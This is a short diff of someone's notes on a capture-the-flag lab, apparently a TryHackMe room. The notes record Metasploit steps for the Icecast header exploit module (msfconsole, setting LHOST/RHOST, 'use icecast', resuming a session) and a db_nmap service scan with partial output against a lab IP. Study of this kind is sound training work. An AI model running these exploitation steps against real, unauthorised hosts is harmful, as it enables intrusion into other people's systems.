@@ -10,14 +10,21 @@ Deploy the machine! This may take up to three minutes to start.
 
 No answer needed
 
+- Note Already was within the VM machine (running previous module that used same box) before so ran the following before starting this box:
+
+msfconsole
+set LHOST / RHOST 'BOX_IP' (ex:set RHOST 10.10.1.12)
+use icecast
+Also already had session running with sessions -i 1
+backgrounded session with ctrl +z
+
 #2	
 Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'RP: Nmap' prior to this room. 
 
 No answer needed
 
-- Note: Ran db_nmap 'BOX IP ADDRESS' and got following results:
-msf5 exploit(windows/http/icecast_header) > set RHOST 10.10.171.143
-RHOST => 10.10.171.143
+- Note: Ran db_nmap -sV 'BOX IP ADDRESS' (basic Syn Scan) and got following results:
+
 msf5 exploit(windows/http/icecast_header) > db_nmap -sV 10.10.171.143
 [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 07:01 UTC
 [*] Nmap: Nmap scan report for ip-10-10-171-143.eu-west-1.compute.internal (10.10.171.143)
